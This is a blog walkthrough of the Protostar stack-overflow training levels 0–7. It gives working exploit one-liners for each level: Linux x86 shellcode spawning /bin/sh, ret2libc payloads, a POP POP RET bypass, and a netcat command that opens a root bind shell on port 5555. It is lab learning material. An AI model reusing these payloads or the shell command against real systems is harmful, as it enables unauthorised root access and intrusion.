---
categories:
- protostar
- stack
comments: false
date: "2013-03-30T23:21:16Z"
title: Protostar solutions - Stack Levels
---

Part two of the three [exploit exercises](http://exploit-exercises.com/) available.  This set of challenges focused purely on memory corruption via stack overflows; the challenges here weren't too difficult, but I wanted to work through them anyway.  A post with the remaining levels will follow.

<h3>Stack Level 00</h3>
Introductory level that introduces stack layout; here, the `modified` variable follows a 64 byte array on the stack.  If the stack is overwritten, the modified variable will be run over.

```
user@protostar:~$ python -c "print 'A'*70" | ./stack0 
you have changed the 'modified' variable
user@protostar:~$
```

<h3>Stack Level 01</h3>
Another introductory level that forces you to overwrite a particular variable with a specific value.  Essentially we need to take level 00 and figure out exactly where to overwrite the modified variable.  This can be trivially guessed, considering we know the buf size.  Remembering that this architecture is little endian:

```
user@protostar:~$ ./stack1 $(perl -e 'print "A"x64 . "dcba"')
you have correctly got the variable to the right value
user@protostar:~$
```

It's also worth noting that, if you're loading this into gdb, the modified variable is volatile, so if you `p &modified` and don't get the right value, don't worry.  You're not crazy.

<h3>Stack Level 02</h3>
Almost a carbon copy of level 1, except this time our input vector is an environmental variable.

```
user@protostar:~$ export GREENIE=$(perl -e 'print "A"x64 . "\x0a\x0d\x0a\x0d"')
user@protostar:~$ ./stack2
you have correctly modified the variable
```

<h3>Stack Level 03</h3>
This level has us redirecting code flow to another function present in the source.  The buffer length is the same as the previous three, so we just need to find out where the function lies. 

```
user@protostar:~$ objdump -d stack3 | grep win
08048424 <win>:
user@protostar:~$ echo $(perl -e 'print "A"x64 . "\x24\x84\x04\x08"') | ./stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:~$ 
```

<h3>Stack Level 04</h3>
Instead of overwriting a function call, we'll be overwriting a return address.  When the function exits, it pops the current stack frame off and returns the saved frame pointer, so we need only overflow the address immediately following EBP.

```
user@protostar:~$ objdump -d stack4 | grep win
080483f4 <win>:
user@protostar:~$ perl -e 'print "A"x76 . "\xf4\x83\x04\x08"' | ./stack4 
code flow successfully changed
Segmentation fault
user@protostar:~$ 
```

<h3>Stack Level 05</h3>
There's no real flag here aside from getting a shell, so we'll need some shellcode now.  Disclaimer: I spent a good deal of time trying to get shellcode working for this, and would continually brick wall at the same spot:

```
(gdb) ni
Executing new program: /bin/dash
Error in re-setting breakpoint 1: Function "main" not defined.

Program exited normally.
(gdb) 
```

During one of my googling escapades, I haphazardly clicked [this](http://www.mattandreko.com/2011/12/exploit-exercises-protostar-stack-5.html) link from someone having the exact same issues with this level.  What should be a very simple buffer overflow turned into a very wonky, absurd tumble through some obscure shellcode issues.  In the end, I came up with this solution:

```
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x76 . "\x80\xf7\xff\xbf" . "\x90"x9 . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' | ./stack5 
# whoami
root
#
```

<h3>Stack Level 06</h3>
This level forces us to place our shellcode in a specific path; i.e. out of userland.  We can't just stick it onto the stack, and we can't place it in an environmental variable.  Instead, we must use ret2[libc|strcpy|gets|etc] or ROP.  It verifies the function's return address by calling `__built_return_address(0)`, which will return the current function's return address. 

This one was pretty fun, as I was able to leverage the ret2libc to pull it off.  I used c0ntext's [ret2libc](http://css.csail.mit.edu/6.858/2012/readings/return-to-libc.pdf) demonstration paper as reference.  I based most of my work off the previous level, and modified it only by adding system() and exit() addresses.  My payload in the end looked like this:

`[80 bytes junk | system() address | exit() address | command]`

For this example, I have my command stashed in the GETME environmental variable:

```
user@protostar:/opt/protostar/bin$ export GETME=/bin/sh
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x86\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췆���
user@protostar:/opt/protostar/bin$ export GETME=/usr/bin/whoami
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x80\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`췀���
root
user@protostar:/opt/protostar/bin$ 
```

I wasn't able to get /bin/sh launched with a system() call, and after checking the man page, it appears that system drops root privileges.  My second thought was to simply open up a reverse shell:

```
user@protostar:/opt/protostar/bin$ export GETME="/bin/nc -l -p 5555 -e /bin/sh"
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\xb0\xff\xec\xb7" . "\xc0\x60\xec\xb7" . "\x72\xff\xff\xbf";' | ./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����AAAAAAAAAAAA�����`��r���
```

I now had a root shell listening on port 5555. 

<h3>Stack Level 07</h3>
The final stack level is almost exactly like the previous level, however this time when it returns from getpath(), it returns strdup(buffer), which returns a pointer to a duplicate string of buffer.  The address range is also now much more restrictive; disabling any address matching 0xb0000000.  The exploit page notes that we should be thinking about a ret2text to exploit this, so I started thinking of ways to ret2plt or ret2dl-resolve, but in the end decided those were likely too advanced for such a simple level.  Instead, I objdump'd the binary in search of a POP POP RET, which would bypass the addressing filter and allow me to take control over EIP.  The first one I found was at `0x8048492`.  After some twiddling, I discovered the following would lead me to code execution: `perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8' . "\xcc"x16 | ./stack7`.  So the payload will look like this `[80 bytes junk | POP POP RET | 8 bytes junk | shellcode]`

I dumped the shellcode from level 5 into this, but for some reason the shell would only spawn if running in gdb:

```
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8 . "\xac\xf7\xff\xbf" . "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"' > /tmp/input
user@protostar:/opt/protostar/bin$ gdb ./stack7
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) r < /tmp/input
Starting program: /opt/protostar/bin/stack7 < /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� '�̀1�Ph//shh/bin��PS�ᙰ

Executing new program: /bin/dash
$ exit
user@protostar:/opt/protostar/bin$ ./stack7 < /tmp/input
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��������������1�1۰ ̀Sh/ttyh/dev��1�f� '�̀1�Ph//shh/bin��PS�ᙰ

Segmentation fault
user@protostar:/opt/protostar/bin$
```

Where `\xac\xf7\xff\xbf` is the address of shellcode.  Instead I threw shellcode into an environmental variable and leveraged Jon Ericson's getenvaddr application to find the offset:

```
user@protostar:/opt/protostar/bin$ export GETME=`perl -e 'print "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
user@protostar:/opt/protostar/bin$ /tmp/test GETME ./stack7
GETME will be at 0xbfffff58
user@protostar:/opt/protostar/bin$ perl -e 'print "A"x80 . "\x92\x84\x04\x08" . "\x90"x8 . "\x58\xff\xff\xbf"' > /tmp/input
user@protostar:/opt/protostar/bin$ ./stack7 < /tmp/input 
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA����������X���
# whoami
root
# 
```

Overall these levels were pretty basic, but I'm looking forward to digging into Fusion for more advanced flags.  
